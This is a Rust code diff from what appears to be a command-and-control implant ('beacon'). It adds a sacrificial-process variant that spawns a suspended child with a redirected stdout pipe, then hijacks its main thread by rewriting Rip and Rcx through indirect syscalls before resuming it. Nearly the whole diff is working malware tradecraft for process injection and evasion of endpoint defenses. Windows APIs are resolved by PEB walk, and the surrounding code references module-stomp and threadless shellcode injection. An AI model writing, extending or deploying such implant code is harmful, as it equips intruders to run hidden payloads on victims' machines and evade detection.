@@ -152,7 +152,7 @@ impl Drop for SacrificialProcess {
 pub unsafe fn create_sacrificial(spawn_to: &str) -> Result<SacrificialProcess, &'static str> {
     let create_proc = unsafe { create_sacrificial_resolve() }?;
     let (mut cmd, mut si, mut pi) = create_sacrificial_buffers(spawn_to);
-    unsafe { create_sacrificial_spawn(create_proc, &mut cmd, &mut si, &mut pi) }
+    unsafe { create_sacrificial_spawn(create_proc, &mut cmd, &mut si, &mut pi, 0) }
 }
 
 /// `CreateProcessW` (kernel32) — resolved via PEB walk for the sacrificial
@@ -197,12 +197,15 @@ fn create_sacrificial_buffers(
 
 /// Spawn `spawn_to` suspended (CREATE_SUSPENDED, no environment, no current
 /// dir) and parse PROCESS_INFORMATION into the Drop-guarded
-/// [`SacrificialProcess`].
+/// [`SacrificialProcess`]. `inherit` is passed verbatim as bInheritHandles
+/// (0 = classic sacrificial; 1 = isolated-BOF child, which must inherit the
+/// stdout pipe prepared in the STARTUPINFOW).
 unsafe fn create_sacrificial_spawn(
     create_proc: CreateProcessW,
     cmd: &mut [u16],
     si: &mut [u8; 104],
     pi: &mut [u8; 24],
+    inherit: i32,
 ) -> Result<SacrificialProcess, &'static str> {
     // CREATE_SUSPENDED (0x4). No environment, no current dir.
     const CREATE_SUSPENDED: u32 = 0x4;
@@ -212,7 +215,7 @@ unsafe fn create_sacrificial_spawn(
             cmd.as_mut_ptr(),      // lpCommandLine
             core::ptr::null_mut(), // lpProcessAttributes
             core::ptr::null_mut(), // lpThreadAttributes
-            0,                     // bInheritHandles
+            inherit,               // bInheritHandles
             CREATE_SUSPENDED,
             core::ptr::null_mut(), // lpEnvironment
             core::ptr::null(),     // lpCurrentDirectory
@@ -237,6 +240,192 @@ unsafe fn create_sacrificial_spawn(
         pid,
         resumed: false,
     })
+}
+
+// ============================================================================
+// B3 isolated-BOF sacrificial variant: stdout pipe + thread-context hijack.
+// ============================================================================
+
+/// `CreatePipe` (kernel32) — anonymous pipe for the isolated child's stdout.
+type CreatePipe = unsafe extern "system" fn(
+    *mut *mut c_void, // hReadPipe (out)
+    *mut *mut c_void, // hWritePipe (out)
+    *const SecurityAttributes,
+    u32, // nSize (0 = default buffer)
+) -> i32;
+
+/// `SetHandleInformation` (kernel32) — clears HANDLE_FLAG_INHERIT on the pipe
+/// read end so only the child holds a writer (EOF semantics).
+type SetHandleInformation = unsafe extern "system" fn(*mut c_void, u32, u32) -> i32;
+
+/// HANDLE_FLAG_INHERIT (SetHandleInformation mask bit).
+const HANDLE_FLAG_INHERIT: u32 = 0x0000_0001;
+/// STARTF_USESTDHANDLES (STARTUPINFOW.dwFlags) — honor the hStd* handles.
+const STARTF_USESTDHANDLES: u32 = 0x0000_0100;
+
+/// SECURITY_ATTRIBUTES with bInheritHandle=1 (shell.rs template): lets the
+/// child inherit the pipe write end.
+#[repr(C)]
+struct SecurityAttributes {
+    n_length: u32,
+    lp_security_descriptor: *mut c_void,
+    b_inherit_handle: i32,
+}
+
+/// Create the sacrificial process `spawn_to` suspended with its stdout AND
+/// stderr redirected to an anonymous pipe the parent drains — the B3
+/// isolated-BOF variant of [`create_sacrificial`] (shell.rs template:
+/// `CreatePipe` + `STARTF_USESTDHANDLES` + `bInheritHandles=1`). Returns the
+/// Drop-guarded process plus the parent's pipe READ handle (the caller owns
+/// and closes it). The parent's copy of the write end is closed here so the
+/// parent's ReadFile hits EOF once the child exits (a lingering parent
+/// writer would block EOF forever — shell.rs precedent). On any failure every
+/// handle opened so far is closed before `Err`; the Drop-guarded process is
+/// never constructed, so nothing leaks and no zombie is left.
+///
+/// # Safety
+/// Uses Win32 CreateProcessW/CreatePipe via PEB-walk resolution.
+/// Single-threaded beacon context.
+pub unsafe fn create_sacrificial_isolated(
+    spawn_to: &str,
+) -> Result<(SacrificialProcess, *mut c_void), &'static str> {
+    let create_proc = unsafe { create_sacrificial_resolve() }?;
+    let (create_pipe, set_handle_info, close) = unsafe { isolated_pipe_resolve()? };
+    let (pipe_read, pipe_write) = unsafe { isolated_pipe(create_pipe, set_handle_info)? };
+    let (mut cmd, mut si, mut pi) = create_sacrificial_buffers(spawn_to);
+    isolated_startup(&mut si, pipe_write);
+    match unsafe { create_sacrificial_spawn(create_proc, &mut cmd, &mut si, &mut pi, 1) } {
+        Ok(proc) => {
+            close(pipe_write); // child holds its own inherited writer
+            Ok((proc, pipe_read))
+        }
+        Err(e) => {
+            close(pipe_read);
+            close(pipe_write);
+            Err(e)
+        }
+    }
+}
+
+/// Resolve the pipe trio (CreatePipe / SetHandleInformation / CloseHandle)
+/// from kernel32 via PEB walk.
+unsafe fn isolated_pipe_resolve(
+) -> Result<(CreatePipe, SetHandleInformation, CloseHandleFn), &'static str> {
+    let cp: CreatePipe = core::mem::transmute(
+        export_addr(b"kernel32.dll", b"CreatePipe").ok_or("CreatePipe unresolved")?,
+    );
+    let shi: SetHandleInformation = core::mem::transmute(
+        export_addr(b"kernel32.dll", b"SetHandleInformation")
+            .ok_or("SetHandleInformation unresolved")?,
+    );
+    let cl: CloseHandleFn = core::mem::transmute(
+        export_addr(b"kernel32.dll", b"CloseHandle").ok_or("CloseHandle unresolved")?,
+    );
+    Ok((cp, shi, cl))
+}
+
+/// Build the anonymous pipe (shell.rs template): the write end is inheritable
+/// (goes to the child), the read end stays in the parent and is marked
+/// non-inheritable so the child is the only writer — that is what lets the
+/// parent's ReadFile see EOF at child exit.
+unsafe fn isolated_pipe(
+    create_pipe: CreatePipe,
+    set_handle_info: SetHandleInformation,
+) -> Result<(*mut c_void, *mut c_void), &'static str> {
+    let sa = SecurityAttributes {
+        n_length: core::mem::size_of::<SecurityAttributes>() as u32,
+        lp_security_descriptor: core::ptr::null_mut(),
+        b_inherit_handle: 1,
+    };
+    let mut read: *mut c_void = core::ptr::null_mut();
+    let mut write: *mut c_void = core::ptr::null_mut();
+    if unsafe { create_pipe(&mut read, &mut write, &sa, 0) } == 0 {
+        // CreatePipe failed — nothing opened yet, nothing to clean up.
+        return Err("CreatePipe failed");
+    }
+    set_handle_info(read, HANDLE_FLAG_INHERIT, 0);
+    Ok((read, write))
+}
+
+/// Stamp the pipe write end into the STARTUPINFOW raw bytes (x64 layout:
+/// dwFlags @60, hStdOutput @88, hStdError @96) so the child's
+/// GetStdHandle(STD_OUTPUT_HANDLE) returns the inherited pipe. hStdInput
+/// stays null.
+fn isolated_startup(si: &mut [u8; 104], pipe_write: *mut c_void) {
+    si[60..64].copy_from_slice(&STARTF_USESTDHANDLES.to_le_bytes());
+    let h = (pipe_write as u64).to_le_bytes();
+    si[88..96].copy_from_slice(&h);
+    si[96..104].copy_from_slice(&h);
+}
+
+/// B3 main-thread context hijack for the suspended sacrificial child: set
+/// Rip = `entry` (the delivered bof-host blob base, offset 0) and Rcx = `arg`
+/// (the packed-payload pointer the bof-host entry parses), then resume. x64
+/// CONTEXT offsets: Rcx @0x80, Rip @0xF8 (same Rip offset `threadless_inject`
+/// uses; confirmed by `nyx_implant_core::context`). ContextFlags 0x00100013 =
+/// CONTEXT_AMD64|CONTROL|INTEGER|DEBUG_REGISTERS (threadless precedent —
+/// INTEGER covers Rcx; the DEBUG_REGISTERS bit is set-but-unmodified). On
+/// success the process is marked resumed (Drop closes handles fire-and-forget
+/// instead of terminating). On ANY failure the thread is left SUSPENDED so
+/// the SacrificialProcess Drop-guard terminates the never-ran child and the
+/// caller can safely fall back to inline execution — unlike
+/// `threadless_inject`'s error paths, which resume a thread they suspended
+/// themselves, this thread was BORN suspended (CREATE_SUSPENDED), so leaving
+/// it suspended is the correct cleanup.
+///
+/// # Safety
+/// Cross-process thread-context ops via the indirect-syscall runtime.
+/// Single-threaded beacon context.
+pub unsafe fn hijack_main_thread(
+    proc: &mut SacrificialProcess,
+    entry: u64,
+    arg: u64,
+) -> Result<(), &'static str> {
+    // Ensure the runtime is up: the rundll32 selftest path never runs the
+    // beacon entry's init sequence (init_global is idempotent).
+    unsafe { nyx_implant_core::syscalls::init_global() };
+    let rt =
+        nyx_implant_core::syscalls::global().ok_or("indirect syscall runtime not initialized")?;
+
+    let mut ctx = AlignedContext([0u8; 1232]);
+    ctx.0[0x30..0x34].copy_from_slice(&0x00100013u32.to_le_bytes());
+    let get = unsafe {
+        nyx_implant_core::syscalls::nt_get_context_thread(
+            rt,
+            proc.main_thread as usize,
+            ctx.0.as_mut_ptr() as usize,
+        )
+    };
+    nt_status_ok(get, "NtGetContextThread failed")?;
+
+    ctx.0[0xF8..0xF8 + 8].copy_from_slice(&entry.to_le_bytes()); // Rip
+    ctx.0[0x80..0x80 + 8].copy_from_slice(&arg.to_le_bytes()); // Rcx
+    ctx.0[0x30..0x34].copy_from_slice(&0x00100013u32.to_le_bytes());
+    let set = unsafe {
+        nyx_implant_core::syscalls::nt_set_context_thread(
+            rt,
+            proc.main_thread as usize,
+            ctx.0.as_mut_ptr() as usize,
+        )
+    };
+    nt_status_ok(set, "NtSetContextThread failed")?;
+
+    let mut prev_count: u32 = 0;
+    let resume = unsafe {
+        nyx_implant_core::syscalls::nt_resume_thread(rt, proc.main_thread as usize, &mut prev_count)
+    };
+    nt_status_ok(resume, "NtResumeThread failed")?;
+    proc.mark_resumed();
+    Ok(())
+}
+
+/// Map an NT status (Option-wrapped, negative = failure) to a unit Result —
+/// the get/set/resume checks above share this exact gate.
+fn nt_status_ok(status: Option<i32>, err: &'static str) -> Result<(), &'static str> {
+    match status {
+        Some(s) if s >= 0 => Ok(()),
+        _ => Err(err),
+    }
 }
 
 /// Module-stomp inject `shellcode` into a fresh `spawn_to` process. Creates the
